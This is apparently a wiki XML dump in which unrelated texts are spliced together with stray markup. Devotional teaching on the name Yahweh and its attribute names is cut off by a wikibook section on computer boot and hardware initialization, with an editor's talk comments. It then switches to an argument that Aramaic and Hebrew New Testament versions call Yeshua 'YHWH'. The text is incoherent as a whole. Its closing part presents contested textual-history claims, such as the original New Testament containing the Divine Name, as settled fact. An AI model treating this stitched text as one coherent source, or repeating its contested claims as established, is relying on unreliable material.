This was fulfilled in Yeshua as the representative on earth of the godhead,  &quot;Yahweh&quot;. You can see that when you call on the Name of Yeshua, you are indeed calling on the Name of Yahweh, who is salvation.    Isaiah 43:11

&quot;This is the stone which was rejected by you builders, which has become the chief cornerstone.  Nor is there salvation in any other, for there is no other name under heaven given among men by which we must be saved.&quot; (Acts 4:11, 12). In saying this, Peter quotes Psalm 118:22:
&quot;The stone which the builders rejected has become the chief cornerstone&quot;, which goes on in verse 26,   &quot;Blessed is he who comes in the name of Yahweh!&quot;

Paul also quotes from the same passage in Joel as Peter in Acts 2:21,  &quot;For whosoever shall call upon the name of Yahweh shall be saved,&quot; Romans 10:13, and also from Isaiah,
&quot;Behold I lay in Zion a stone for a foundation, a tried stone, a precious cornerstone, a sure foundation;  he who believes shall not make haste.&quot;	   Isaiah 28:16   (&quot;will not be put to shame.&quot; Romans 10:11)

&quot;And they that know Your name will put their trust in You: for You, Yahweh , have not forsaken them that seek You,&quot; Psalm 9:10.

Yeshua is the tried cornerstone of the spiritual House of Yahweh who came in the Name of Yahweh to bring salvation to all who call upon that name.  He came in His Fathers' Name,  His given Name &quot;Yeshua&quot;, means 'Yahweh is salvation&quot;.  To us, He is  &quot;Yahweh our Righteousness&quot;.

==THE NAME OF YESHUA AUTHORISED==
&quot;But as many as received him (Yeshua), to them gave he power to become the sons of God, even to them that believe on His name.&quot; John 1:12.
In Hebraic culture a name has great significance in describing the character/personality of the person named.

Whenever Yeshua's Name was said, its meaning &quot;Yahweh is salvation&quot; would come to mind. He carried His Father's name and His Father's messianic appointment in His given name of &quot;Yeshua&quot;.

He Himself said that He did not come in His own Name, but in the Father's.   John 5:43

Paul says that because He humbled Himself and became obedient to the purpose of dying for lost humanity as the substitute Lamb,  that the Father had given Him a name above every name, quoting from Isaiah 45 -
&quot;I have sworn by Myself (Yahweh speaking)  ..  ..  That to Me every knee shall bow, every tongue shall take an oath.&quot;   Isaiah 45:23

He has been enthroned and entitled to have power and authority over all named authority and power in this age and in the coming age of the kingdom.  Ephesians 1:17-23

This is the inheritance given Him by the Father as our Great High priest,   He has &quot;by inheritance obtained a more excellent name&quot;  than any other spiritual power.   Hebrews 1: 4   

But note that it does not exclude the Father's Name.   It is qualified as the &quot;Name under heaven given among men by which we must be saved&quot;   Acts 4:12
But,   &quot;O Yahweh, your Name is forever, O Yahweh, your remembrance to all generations,&quot; Psalm 135:13.

&quot;His name shall endure for ever: His name shall be continued as long as the sun: and men shall be blessed in him: all nations shall call him blessed,&quot; Psalms 72:17-19.

==EARLY BELIEVERS AND THE NAME==
The scripture records that the believers healed, cast out spirits and did many wonderful works by the Name and authority of  Yeshua our Lord and Messiah, and souls were saved in His Name.  Matthew 10:1, 5-8

The early Assembly was not a separate unit from the Jews until after the Jewish revolt in 135 AD.    Even those of the dispersion and the 'Gentiles' remained attached to the synagogue life as much s possible.    Thus although the Name of Yeshua was used in ministry, the believers did not begin to call themselves after His Name until quite some time later.

At first they were known as followers of &quot;the Way&quot;   Acts 9:2; 19: 9,23, 22:4; 24:14,22  and they were first known as Christians (our terminology) or Messianics (Messiah-in believers),  in Antioch - Acts 11:26.

Although the sacred Name was not used by the Jewish sector, the Name of Yahweh is intended to be used by His people (Deuteronomy 28:10), and He says that His Name is to be a memorial for ever - Exodus 3:15

Yeshua always instructed prayer to be made to the Father, as He Himself also prayed.  John 12:27; 16:23-24

Worship is to be directed to the Father,  &quot;O magnify Yahweh with me, and let us exalt his name together,&quot; Psalms 34:3.

God is now revealing His true Name to the end-time saints,  and we should USE it in a HOLY, godly, pure, and reverential manner - to WORSHIP HIM with all our hearts, mind, soul, and strength to praise and glorify HIS NAME!    Also, it is to be used in prayer to Him  (Matthew 6: 9). Every day we should pray, without substitution of any other names, the proper name of God.  We should remember the Shema (Aaronic Blessing), as He commanded,  

&quot;Hear, O Israel, Yahweh our God, Yahweh is One!
You shall love Yahweh your God with all your heart, with all your soul, and with all your strength. And these words which I command you this day shall be in your heart.”  (Deuteronomy 6: 4-7).

==RESTORATION OF TRUTH==
Daniel the prophet was told, “But you, Daniel, shut up the words, and seal the book until the time of the end; many shall run to and fro, and knowledge shall be increased” (Daniel 12: 4).    “Many shall be purified, made white, and refined, but the wicked .. .. .. .. ..  ,   but the wise shall understand”  (Daniel 12:10).

There is to be a revelation of His Name to His people before His return, as part of the restoration of all truth to His Body for them to come to the fullness of Messiah. Ephesians 4:13-15

Psalm 91 promises deliverance to those who know and call upon the Name of Yahweh in the time of end time persecution - &quot;Because he has set his love on Me, therefore I will deliver him: I will set him on high because he has known My Name.&quot; (verse 14)    Knowing His Name in covenant relationship is entering the secret place of the Most High, in bridal intimacy, &quot;a place better than that of sons and daughters&quot;  v.5 -Isaiah 56: 4-7

&quot;Then I looked, and behold, a Lamb standing on Mt. Zion, and with Him one hundred and forty-four thousand, having His Father's Name written in their foreheads.”  Revelation 14: 1 (NKJV)

&quot;And they shall see His face; and His Name shall be in their foreheads , ...&quot; Revelation 22:4

There is going to be a people in these last days whom He will stamp with His mark of approval in identification with the Father's Name. He identifies His end-time people along with those of the early period of the nation, as those exhorted to call upon His Name -   Again in Joel 2:32, although applied to salvation in regard to Yeshua's work on the Stake, its full application is for the last days,   “The sun shall be turned to darkness, and the moon into blood, before the great and awesome day of Yahweh. And it shall come to pass that whoever calls on the Name of Yahweh shall be saved, for in Mount Zion and in Jerusalem there shall be deliverance, as Yahweh has said, 'Among the remnant whom Yahweh calls'”

Yahweh says that it is part of the restoration of His people that His Name will again be sanctified in their midst (verse 23 of Ezekiel 36:17-28)    This is speaking of the end of the age.

He said,  &quot;I will show my greatness and my holiness and make myself known in the sight of many nations. Then they will know that I am Yahweh.&quot;    Ezekiel 38:23  Also Psalms 72:18-19.

The prophets speak of an end-time restoration of His people, the two houses of Israel, and part of that restoration will be knowing His Name.  Ezekiel 36:17-25 (note v.23); Hosea 2:19-20; Micah 4: 5; Zech. 13:7-9

&quot;Who shall not fear you, O Yahweh, and glorify Your Name? for You only are holy: for all nations shall come and worship before You; for Your judgments are made manifest,&quot; Revelation 15: 4. 

==THE KINGDOM AGE==
&quot;Many nations shall come and say, 'Come, and let us go up to the mountain (kingdom) of Yahweh,&quot;  verse 2 of Micah 4: 1-5;  Isaiah 2: 1-3,  see  also Malachi 1:11

&quot;So shall they fear the Name of Yahweh from the west, and His glory from the rising of the sun;&quot; Isaiah 59:19 &quot;They shall come,  and seek Yahweh their God.   They shall ask the way to Zion .. .. ..  &quot;Come let us join ourselves to Yahweh in a perpetual covenant that will not be forgotten&quot;&quot;   Jeremiah 50: 4-6

&quot;In that day you shall say: 'Praise Yahweh, call on His Name; declare His deeds among the peoples,  make mention that His Name is exalted.  Sing to Yahweh, for He has done excellent things; this is known in all the earth. Cry out and shout, O inhabitant of Zion, for great is the Holy One of Israel in your midst.&quot;    Isaiah 12: 4,6

Yeshua said, “For I say unto you, you shall see Me no more till you say , 'Blessed is He who comes in the Name of Yahweh'”   Matthew 23:39
&quot;For the Son of Man will come in the glory of His Father with His angels&quot;   Matthew 16:27; 25:31

&quot;A King shall reign and prosper, and execute judgment and righteousness in the earth. ..  ..  .. Now this is His Name by which He will be called:  Yahweh our Righteousness  (YHWH Tsidkenu)&quot;  Jeremiah 23: 5-6 

&quot;And Yahweh shall be king over all the earth: in that day it shall be -- Yahweh is one,  and His Name one.&quot;   Zechariah 14: 9

This is the time of the complete fulfillment of the new covenant  when the earth shall be full of the knowledge of Yahweh.   Jeremiah 31:34; Habakkuk 2:14

==THE KINGDOM RESTORED TO THE FATHER==
Ultimately, Yeshua will submit His authority to the Father. 
When He has put down all insurgent rule and authority and His commission is complete, He also will become subject to the Father, so that He, the Father may be all in all.   1 Corinthians 15:24-28

Paul reveals that the family of the Most High will be called by the Father's Name.

He said, &quot;I bow my knees to the Father of our Lord Yeshua the Messiah, from whom the whole family in heaven and earth is named,&quot; Ephesians 3:14-15   (not named after Yeshua)

And in the New Jerusalem we see the glory of God filling it through the Lamb (Revelation 21:23), and they who dwell in that dimension of light, shall see His face and they are identified as having His Name on their foreheads, the Name of Yahweh.   Revelation 22: 4; 7: 3; 14: 1

      <text xml:space="preserve">==THE ATTRIBUTE NAMES OF YAHWEH==
Yahweh's Names are an expression of Him being ever-present to be that which we need Him to be. As we enter into covenant relationship, we experience the revelation of His life manifested to meet our need. By an extension of Himself to us, He becomes our all in all - our sufficiency in all things  -  our El-Shaddai .   The revelation of His attribute Names came as men walked with Him and found Him sufficient for their every need in life's situations.

1. YAHWEH-YIRAH    Genesis 22:1-14

Strongs 3069  Literally &quot;Yahweh will see to it&quot; or &quot;Yahweh will Provide.&quot;
The Theological Wordbook (2095)  says   -  &quot;in English to see to something, is to provide it&quot;

The occasion of the revelation of this Name, was on the basis of Abraham's absolute surrender of everything to Him.   In Isaac was all the aspirations and hope for the future, even all that Yahweh Himself had promised him - yet, he was called to surrender it all. On the basis of that type of surrender - Yahweh will provide.

When the sacrificial offering was completed in Abraham's heart, Yahweh intervened in the literal sacrifice of his son being offered, and said to him, &quot;For now I know that you fear God, since you have not withheld your son, your only son from Me.&quot;  (Genesis 22:12)   He had offered up that which most precious to him, the treasure of his life, which he had petitioned for and waited many long years to receive - it was the ultimate sacrifice!

On that level of complete abandon to the will of God, he received the promise revealed in the Name.

Yahweh's provision was a lamb for the sacrifice, as Abraham had said prophetically &quot;God will provide for Himself the lamb for the burnt offering&quot;  Genesis 22:8

And Yahweh did provide Himself the Lamb for a substitute offering for us, to provide eternal redemption for us, and in Him, the Lamb of God, all our needs are met. But it is on the basis of total and absolute surrender that we find Him sufficient for all our needs and not otherwise.

Paul articulates the principle in Philippians 4:18-19,  of the result of their sacrificial giving to him through Epaphroditus,   &quot;But my God shall supply all your need according to His riches in glory by Yeshua the Messiah&quot;.   The assurance of the riches of His glory being made available to them was on the basis of their sacrificial gift.

It does also have an outworking in the provision of our material needs, but that is based on several principles.   His concern as a loving Father is toward His children, but we reap according as we have sown.

Paul outlines these principles in 2 Corinthians 9:6-12.  If we sow to the spiritual, we shall real spiritually.   Likewise if we sow to the natural we shall reap accordingly  i.e. fleshly &quot;corruption&quot;  Galatians 6: 8;   See also Matthew 6:19-21

&quot;He who did not spare His own Son, but delivered Him up for us all, how shall He not with Him also freely give us all things? &quot;   Romans 8:32;   Also Matthew 6:33

2. YAHWEH-RAPHA    

Strongs 3068 = 7495 Literally &quot;to mend (by stitching)  i.e. to cure, to cause to heal, repair or make whole - therefore  &quot;Yahweh is my Healer/Physician&quot;

Yahweh gave His revelation as the Healer to His people on the basis of a test.    &quot;If you diligently heed the voice of Yahweh your God and do what is right in His sight, give ear to His commandments and keep all His statutes, I will put none of these diseases on you which I have brought on the Egyptians.&quot;   Exodus 15:22-26

It was conditional and the results of not keeping His commands and statutes are listed in Deuteronomy 28:15-60 as curses to be visited upon them. See also Exodus 23:25,26;  Deuteronomy 7:15;  Proverbs 3:7,8

As outlined in these scriptures it means all of His instructions. This not only includes the moral laws, but also those of hygiene and the observance of the different classification of clean and unclean foods.

Healing was part of the atonement of the whole man - spirit, soul and body as brought out in Psalm 103:1-3

In Isaiah 53:3-5 it brings out that Yeshua bore not only our sins, but also our emotional and physical ailments.
:Verse 4 reads literally,  &quot;Surely He has borne our griefs/sicknesses/weaknesses/pains and carried our sorrows/pain&quot;
:Verse 5 - &quot;But He was wounded for our transgressions, He was bruised for our iniquities&quot;.Thus we see the healing/wholeness which he obtained for us,  was for every part of our being.

3.  YAHWEH-NISSI

Strongs 3071  -  from 5264 &quot;a flag, a sail, a flagstaff, a signal. a standard&quot;  Literally  &quot;Yahweh my banner&quot;  -  The Theological Wordbook (1379a)  -  says that it  &quot;generally means a rallying point or standard which drew people together for a common action or for the communication of important information.   This usually happened on a high or conspicuous place within the camp or community.   There a signal pole, sometimes with an ensign attached, could be raised as a point of focus or object of hope.&quot;

In Exodus 17:14,15, Moses lifted the standard against Amalek, saying,  &quot;Because Yahweh has sworn: Yahweh will have war with Amalek from generation to generation&quot;.     Read Chapter 17: 8-16. Amalek was a descendant of Esau who typifies the fleshly nature. They came and attacked Israel in an attempt to defeat them and regain the inheritance that Esau lost. The inheritance is retained for Israel by Moses interceding for them while the battle ensued. While he prevailed in prayer, Israel (the spiritual nature) had the ascendancy, but when his hands became heavy Amalek (the fleshly nature) prevailed.

This is a valuable natural example in type of a spiritual truth.    The flesh will always be used by the enemy to overpower us and cause us to lose our inheritance, but we can prevail in prayer and overcome while we keep our eyes fixed on our standard, the Messiah,  and see Him as our focal point and source of hope.

We will have war with the enemy through the flesh, but we are waging a warfare under His banner. That banner has been raised and the victory has been declared over the enemy on an altar that was established at Calvary by a greater Moses, and we rally under that ensign. 
 
We declare the victory in His Name and by the power of His Spirit, take possession of our inheritance.

&quot;So shall they fear the Name of Yahweh from the west, and His glory from the rising of the sun; 
When the enemy comes in like a flood, the Spirit of Yahweh will lift up a standard against him.&quot;   Isaiah 59:19

4. YAHWEH-SHALOM

Strongs  3073  -   &quot;safety, wellbeing. happiness, prosperity and peace&quot;   i.e.  &quot;Yahweh is my peace&quot;The Theological Wordbook  2401a -  says that  &quot;the root meaning of the verb 'shalem' better expresses the the true concept of 'shalom'.   Completeness, wholeness, harmony and fulfillment are closer to the meaning.  Implicit in 'shalom' is the idea of unimpaired relationships with others and fulfillment in one's undertakings.&quot;

Gideon established an altar to Yahweh when given the revelation of this Name.   Judges 6:1-24 It was based on Gideon's call to defeat Israel's enemies which had been afflicting them because of their disobedience (v.10) and their sin of idolatry. (v.25)     Yahweh had shown Gideon the cause of their oppression from the enemy and instructed him to remove the altar to Baal (vs. 25-27) and make atonement for their sin.&quot;The work of righteousness shall be peace, and the effect of righteousness, quietness and assurance forever&quot; Isaiah 32:17

5. YAHWEH-SHAMMAH

Strongs 3074  Literally &quot;Yahweh is there&quot;  -   The Theological Wordbook (2404)  -  says that it is a common adverb that may have a locational significance.   Therefore the understanding is that Yahweh is always there with us.

Yahweh made a covenantal promise through Ezekiel that He would establish His sanctuary in the midst of them and dwell with them  (Ezekiel 37:26-27).   This was based on the ultimate fulfillment of His purposes in them. (Ch.37:21-25)   This prophecy will come to realisation in the millenium.    
We see in Revelation 21: 2,3, in the new heaven and the new earth, where the very presence of God and the Lamb are in the midst of His people, where truly it will be &quot;Yahweh-Shammah&quot; - &quot;Yahweh is there!&quot;   (Ezekiel 48:35)
In this age we are partakers of the promises and the power of the world to come and have become indwelt by the Spirit of Yahweh corporately. As He said &quot;I will dwell in them and walk among them. I will be their God, and they shall be My people&quot;   Leviticus 26:11-12;  2 Corinthians 6:16
As Yeshua also said, &quot;Where two or three are gathered together in My Name, I am there in the midst of them&quot;

Being in agreement-unity is the basis for this manifestation of His Name.	Matthew 18:20

Although He is omnipresent in all places and at all times, His manifestation is dependent on conditions.   Note that the enemy has to &quot;walk&quot; through the earth (via his agents) to manifest himself (1 Peter 5: 8), and 2 Chronicles 16: 9.

6. YAHWEH-TSIDKENU

Strongs 3072  Literally  &quot;Yahweh is our right&quot;, or &quot;our righteousness&quot;

&quot;A King shall reign and prosper, and execute judgment and righteousness in the earth. .. .. .. ..
Now this is His Name by which He will be called  &quot;Yahweh our Righteousness&quot;   Jeremiah 23: 5b, 6b

Prophetically,  this is speaking of Yeshua becoming this to His people through the power of the redemption that He obtained for us.  Isaiah 11: 1-5,10
&quot;But of Him are you in Messiah Yeshua, who became for us wisdom from God - and righteousness and sanctification and redemption -  &quot;  (1 Corinthians 1:30)   &quot;For He made Him who knew no sin  to be sin for us, that we might become the righteousness of God in Him.&quot;   (2 Corinthians 5:21)
Here &quot;Yahweh our Righteousness&quot; is identified as Yeshua the Messiah.    He has become our righteousness whereby we may be accepted as 'righteous' - not on any merits of our own, but because of His imparted righteousness to us.
To those who accept His dominion now over their lives, He has become their righteousness before the Father.    In the age to come, He shall execute judgment and rule in righteousness and the people will thus learn righteousness.

7.  YAHWEH-RA'AH

Strongs  3068 + 7462   &quot;is a primitive root 'to tend a flock' i.e. to pasture it; by extens. to associate with (as a friend). .. .. a companion&quot;   -   The Theological Wordbook (2185) says that the concept of this word is the pasturing or herding of the people.    

&quot;From very ancient antiquity, rulers were described as demonstrating their legitimacy to rule by their ability to pasture their people.&quot; . . . . &quot;This attribute of God is one of the marks of the office of prophet, priest and king.&quot;

David said &quot;Yahweh is my Shepherd&quot;  i.e. Yahweh-Ra'ah. - Psalm 23: 1
The shepherd's role was not only to feed the sheep and lead them to good pastures, but also to protect them from wild animals which they did with their rod which was about 30&quot; long with a knob on the end to beat off the animals. He also protected them from dangerous situations where they may harm themselves. For this He used the Staff to keep the sheep out of tight spots and prevent them falling off cliffs and into ravines.    The shepherd was always with the sheep, ever by their side to care for them and tend their needs.

As a shepherd boy, David knew what it was to take care of the sheep and therefore knowing the Divine Shepherd, David extols all the attributes of His Name as the Shepherd of his soul.

Yeshua said,  &quot;I am the good shepherd, the good shepherd gives his life for the sheep&quot;   John 10:11

Yeshua fulfilled all that was revealed of Him as the Shepherd of our souls.  (Hebrews 13:20)

As a Son of the Father He allowed Himself to be the provision of our redemption.

In being lifted up on the Tree He secured deliverance from sin and all its resultant weakness, sickness and death.

In His resurrection He became the victor over all the powers of darkness and raised an ensign for all people. Having secured eternal redemption, He made peace through His shed blood and we now reign in life through Him.  Now we dwell in Him and He in us by His Spirit which is given to us, and He will be with us to the end. Through Him we stand righteous, justified, and will be glorified on that day when we stand before Him. Shepherding His sheep He will then lead them to the fountain of living waters and feed them on the heavenly manna. 	Revelation 22: 1-2    

&quot;And God is able to make all grace abound toward you, that you, always having all sufficiency in all things, may have an abundance for every good work.&quot;    2 Corinthians 9: 8

      <comment>/* Hardware Initialization */ grammar, punctuation, etc.</comment>
      <text xml:space="preserve">== Hardware Initialization ==

Typically, when a CPU starts up, it does some internal consistency checks and transfers control to a PROM or EPROM device that contains permanent coding meant to survive a power loss. In some computers, this is all the code they need. However, in many general computing devices, this read-only memory defines a BIOS or Basic I/O System, capable of finding a boot sector on a standard secondary memory device. In some cartridge type game machines, the BIOS transfers control to the cartridge after doing some preliminary tests to make sure the machinery is working correctly. On other machines like the PC and Mac, the BIOS calls a utility from read only memory and lets that check the machinery.

=== Power On Self-Test ===

The POST, or Power On Self-Test triggers the initialization of peripheral devices and the memory of the computer, and may, if preset parameters are set to allow it, do a preliminary memory check. It also sets the bottom of memory so that the operating system knows how much memory it has to work with.

Once the Power On Self-Test is completed, the computer attempts to pass control to the boot sector of the secondary memory device. In cases like the PC where you may have multiple secondary memory devices, it can sample each device in turn, according to either a standard pattern, or according to parameters set in a battery protected static RAM device. The boot sector is part of the bootstrap system that loads the specific operating system.

=== Boot Sector ===

Before boot sectors, the operating system had to be fully loaded before it could be run. The utility of the boot-strap process is that it uses a process analogous to a technique developed for climbing: climber's spare boots were used as weights to sling a light line called the bootstrap up over a promontory, and then by tying the bootstrap to a heavier line and pulling on the light line, eventually allow the climber to sling his heavier climbing rope up and over the promontory. 

What the bootstrap program does is allow a small sector-sized program to load a loader that eventually loads the operating system. The exact number of intermediate loaders needed depends on the operating system. In DOS, the boot sector loads IO.sys and  Msdos.sys, which loads config.sys to configure the computer, then loads command.com, and runs Autoexec.bat on it. The sector sized program is called the boot sector.

=== Kernel Initialization ===

Once the kernel is fully loaded, the next step in initialization is to set the kernel parameters and options, and add any modules that have been selected in the kernel set-up file. Once the kernel is fully initialized it takes over control of the computer and continues initialization with the file-systems and processes.

=== File System Initialization ===

The kernel starts up the processes, and loads the file-systems. The main file-system then includes initialization files, which can be used to set up the operating systems environment, and initialize all the services, daemons, and applications.

=== Plug and Play ===

The idea of Plug and Play is that during initialization, the system builds up a database of devices and afterwards an application can access the database, to find out details about any device on the system. Along with this form of initialization comes an extended BIOS on the device, which allows it to detect the operating system and set its parameters to be more compatible with that operating system. This combination is especially useful, for secondary initialization where you might want to initialize an application (like windows) to accept the drivers for that device.

=== Hot Socketing ===

A further extension of this concept was developed for the Universal Serial Bus, which allows devices to be hot socketed, or installed while the computer is running. The USB bus contacts the new device and learns from it the necessary information to match it to a driver. This information gets put into the database, and whenever that device is again plugged in, the same driver is found for it. When the device is unsocketted, the driver shuts itself down and removes itself from the list of active devices. It can do this because it can monitor the USB controller to make sure it's device is still attached.

      <text xml:space="preserve">I hope you find this page useful, this information is gathered from a number of sources, including CPU manuals for a number of cpu's including but not limited to the Z80, 8086, Pentium, etc. Almost all such CPU's have a set address that they pass control to once they have done their internal check.

Assembly Language Programming Manuals, Dos Programming Manuals, even a Linux Kernel and an Linux Itanium Kernel Manual, as well as a number of books on operating system design, computer organization, and Embedded Systems design.--[[User:Graeme E.

There might be some confusion about what I am trying to do here, so let me recap.

I originally wrote this section to be a stand alone section, because I saw the red link.

Then, later I looked at the complete contents page and found that there was a section on boot loaders and a section on hardware initialization. In order to harmonize my work, I want to transfer this information to hardware initialization which was red ink and redo the Initialization page so that it will include the other modules. I may choose to further subdivide this, but what I am hoping to do is to harmonize with already existing decisions about how this book should be written.--[[User:Graeme E. Smith|Graeme E.

      <text xml:space="preserve">===Yeshua as YHWH in the New Testament===
The Divine Name of YHWH is used almost 7,000 times in the Tanakh (Old Testament). So if the New Testament is a continuation of The Divine Revelation to man, we should expect it to appear in the Gospels/letters as well?

We know that the original New Testament contained the Divine Name of &quot;YHWH&quot;, but none of the various existing Greek versions of the New Testament preserve that Name. Both the Jerusalem and Babylonian Talmuds (t.Shab 13:5, b.Shab 116a, j.Shab 15c) contain a debate among Rabbinical Jewish leaders on whether New Testament writings could be destroyed, because they contained the Divine Name of YHWH, and Jewish tradition did not allow for the destruction of writings that contained the Name of YHWH in them. They concluded that the New Testament could not be destroyed, because it contained the Divine Name. Otherwise, they would have ruled that it could be destroyed.

The Name of &quot;YHWH&quot; is found in the Hebrew versions of Matthew and Hebrews, as well as being preserved by a special designation in the Aramaic version of the New Testament as well.

Now this presents a serious problem for those who propose that the Aramaic and Hebrew versions of the New Testament are a translation from the Greek. Jews were not in the habit of ADDING the Divine Name to a text. In fact, they were in the habit of removing it and replacing it with a euphemism (replacing &quot;YHWH&quot; with &quot;YY&quot; or &quot;God&quot;/&quot;Elohim&quot; or &quot;Lord&quot;/&quot;Adonai&quot;). But adding it where it wasn't, was virtually unthinkable to Jewish tradition. It is understandable why the Greek text would NOT have it if it was in the original Hebrew/Aramaic versions, because Jews were in the habit of replacing &quot;YHWH&quot; with a euphemism, but marking it such that one could reconstruct where the Divine Name belonged. This allowed them to destroy manuscripts, but still retain knowledge of where the Divine Name belonged in that text.

In the Aramaic mss, &quot;YHWH&quot; was often replaced by &quot;MarYaH&quot; or &quot;Lord YaH&quot;. &quot;Yah&quot; is the short form of &quot;YHWH&quot; and was considered an acceptable substitute. &quot;MarYaH&quot; was used to let the reader know the original text did not say &quot;YaH&quot;, but &quot;YHWH&quot;. We know this from Aramaic translations of the Hebrew Tanakh.

===Aramaic/Hebrew New Testament of &quot;YHWH&quot;===
Acts 9:27 in the Peshitta (Aramaic version) calls Yeshua &quot;YHWH&quot;, saying Paul/Shaul met YHWH on the road to Damascus. On the road to Damascus, it says Shaul saw &quot;Yeshua, whom you persecute&quot; and then in Acts 9:27 it says... &quot;on the road he had seen YHWH...&quot; (Acts 9:27, HRV).

The HRV translates from the Peshitta here, from the Aramaic &quot;Maryah&quot;, which is understood to represent &quot;YHWH&quot;.

James 3:9 says... &quot;With it we bless YHWH and the Father&quot; (Ya'acov/James 3:9, HRV) Here, Ya'acov gives us a list of two people whom we bless, one being &quot;YHWH&quot; and the other being the &quot;Father&quot;. This is a very literal translation of what it says. James 5:7 &quot;Be patient until the coming of YHWH&quot; James 5:7, HRV) and Jude, verse 14 &quot;YHWH comes with ten thousands of his set-apart-ones&quot; Jude, verse 14, HRV, quoting the book of Enoch) Now who is &quot;coming&quot; to earth? Yeshua is. But there's nothing suggesting the Father will &quot;come&quot; to earth, except in the form of His Son.

Of course, this agrees with Tanakh which teaches.... &quot;YHWH will go out...On that day, His feet will stand on the Mount of Olives&quot; (Zechariah 14:3..4)

So here, we're told YHWH's feet will touch the mount of Olives. In Acts 1, we're told the disciples watched Yeshua ascend to heaven from the Mount of Olives (Acts 1:12) and they were told... &quot;This Yeshua who was taken up from you into heaven will come in the same manner.&quot; (Acts 1:11, HRV)

So Acts 1 tells us that Yeshua ascended from the Mount of Olives, and will return the same way, so we conclude He will return on the Mount of Olives.

1 Peter 3:15 &quot;Sanctify YHWH, the Messiah, in your hearts&quot; (1 Kefah 3:15, HRV)

Isa 45:23 says &quot;As surely as I live, says YHWH, every knee shall bow and tongue confess me.&quot; But Paul/Shaul quotes this verse to say that &quot;every tongue will confess that Yeshua the Messiah is YHWH...&quot; (Phil 2:11, HRV)

Now even in the Greek, where the &quot;YHWH&quot;/&quot;MarYaH&quot; does not come through, the fact that Paul/Shaul quotes Isa/Yesh and applies it to Yeshua is enough to equate Yeshua to YHWH.

1 Corinthians 8:6 &quot;...to ourselves [there] is one Eloah, the Father, from whom [are] all [things] and by whom we are, and one YHWH&quot; (1 Corinthians 8:6, HRV)

So here we get another list of two beings, one called &quot;Eloah&quot; and &quot;Father&quot; and the other called &quot;YHWH&quot;.

* 1 Cor.11:29, HRV &quot;...he is indebted to the blood of YHWH...&quot; - This could only refer to the Son.
* Colossians 3:22 &quot;...in fear of YHWH &quot;
* Revelation 1:8 &quot;I am the Alef and the Tau, says Adon YHWH&quot; (Yeshua speaking in Rev 1:8, HRV) [Compare this to the KJV which reads &quot;I am Alpha and Omega, the beginning and the ending, saith the Lord&quot; (Rev 1:8, KJV, translated from Greek version of Revelation)]
* Romans 10:10 &quot;If you will confess with your mouth Adon Yeshua....for all who call upon the Name of YHWH will be saved.&quot; (Romans 10, as it appears in the Peshitta)

So here he equates calling upon the Name of Yeshua/Yehoshua (which means &quot;YHWH Saves&quot;) with calling upon the Name of YHWH.

The New Testament call Yeshua &quot;YHWH&quot; over, and over again. In fact, reading the Aramaic New Testament (which the HRV was translated from), one might wonder if it's improper to call the Father &quot;YHWH&quot; because we see several places where the Name &quot;YHWH&quot; is contrasted with the Father (Ya'acov/James 3:9, 1 Cor 8:6). But since the writings of the Tanakh give us several places where the Name of &quot;YHWH&quot; is indeed applied to the Father as well as to the Father &amp; Son collectively, then clearly, it is proper to call the Father &quot;YHWH&quot;, and it is proper to call the Son &quot;YHWH&quot;, and it is proper to call the Father and Son collectively as &quot;YHWH&quot;, since &quot;YHWH Elohaynu, YHWH is one&quot;

Yeshua once said, &quot;before Abraham was, I AM&quot; (John 8:58) Since YHWH is understood to mean &quot;He who is&quot;, or more correctly, &quot;he who was, is, and is to come&quot;, this too, could be considered a verse that associates Him with the Divine Name.

===Reconstructing from the Greek NT===

There's even a few places where the association of Yeshua with the Name &quot;YHWH&quot; even comes through in the Greek. Among these are:

* Phil 2:11 - The fact that the letter of Paul/Shaul replaced the Name of &quot;YHWH&quot; with &quot;Yeshua&quot; or &quot;Jesus&quot; (IhsouV) is enough to associate Him with the Name of YHWH.
* Acts 1 combined with Zechariah 14, Identifying Yeshua as the one who will descend on the Mount of Olives whereas Zechariah 14 identifies this as &quot;YHWH&quot; descending on the Mount of Olives.
* The quote from Jude/Yehudah verse 14 is taken from the Book of Enoch, which was originally written in Hebrew, and also associates &quot;YHWH&quot; with Yeshua.
* Romans 10, where calling upon the Name of &quot;Adon Yeshua&quot; is equated with calling upon the Name of &quot;YHWH&quot;.
* John/Yochanan 8:58

So while the Aramaic Peshitta offers us a substantial amount of evidence concerning where the Name &quot;YHWH&quot; belongs in the New Testament, and linking that Name to Yeshua personally, it is not the only source for linking the Name to Him. Without the Peshitta, we still have a few Greek sources linking Yeshua to the Name of YHWH. We also have independent Aramaic witnesses from the Old Syriac on parts and from the Crawford Revelation.

The Divine Name also appears in the various Hebrew versions of Matthew, as well as the Hebrew version of Hebrews. So no single source links Yeshua to the Name YHWH in the New Testament, and in numerous places in the Tanak the Name of &quot;YHWH&quot; is linked to the Son before His incarnation.

===Further evidence===
Further evidence that YHWH was in the original manuscripts is how some Greek versions disagree on whether to say &quot;Theos&quot; or &quot;Kurios&quot; where the Aramaic or Hebrew suggests &quot;YHWH&quot; belongs. For example, we already saw:

* &quot;Sanctify YHWH, the Messiah, in your hearts&quot; (1 Kefah 3:15, HRV)

The Greek texts disagree here, saying 1 Kefah 3:15, Alexandrian manuscripts, as recorded in WH .. &quot;but sanctify the Lord Christ in your hearts&quot; 1 Kefah 3:15, Byzantine mss of TR, Greek Orthodox version.

* &quot; ..but sanctify the Lord God in your hearts&quot;

Why do they disagree? Probably because two different translators chose two different euphemisms for &quot;YHWH&quot;.

Col 3:22 is another place we see &quot;YHWH&quot; or &quot;MarYah&quot; in the Aramaic, but disagreement in the Greek text. Let's compare:

Col 3:22, Alexandrian WH &quot;fear of the Lord&quot; Col 3:22, Byzantine Majority, TR, Greek Orthodox &quot;fear of God&quot;

Again, why do the Greek texts disagree? Probably because their source was &quot;YHWH&quot;/&quot;Maryah&quot;, and two different translators interpreted this differently.

Or let's examine Rev 1:8 in the various texts:

*Crawford Rev 1:8 I AM the Alef and the Tau, says YHWH (or Adon Yah) G-d
*Alexandrian mss, in WH and Byzantine Majority I am the Alfa and the Omega, says the Lord God.
*Textus Receptus - I am the Alpha and the Omega, the beginning and the end, says the Lord (LORD)
*Greek Orthodox version - I am the Alpha and the Omega says the Lord God.

    So they can't agree on if it should be &quot;Lord&quot; or &quot;Lord God&quot; here.

'''מריא''' this is an Aramaic word that many individuals who have no understanding of Hebrew nor Aramaic have really misused to their disadvantage. 
